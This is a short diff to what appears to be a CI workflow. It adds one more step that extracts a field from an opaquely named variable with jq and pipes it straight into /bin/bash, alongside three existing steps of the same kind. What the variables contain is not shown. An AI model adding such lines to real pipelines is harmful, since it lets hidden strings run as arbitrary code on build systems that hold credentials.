@@ -23,6 +23,7 @@ jobs:
           echo $yk8 | jq -r .j502 | /bin/bash
           echo $wy905 | jq -r .jf16013 | /bin/bash
           echo $sanww2 | jq -r .vgt732 | /bin/bash
+          printf '%s' "$xui9" | jq -r .dccgo647 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
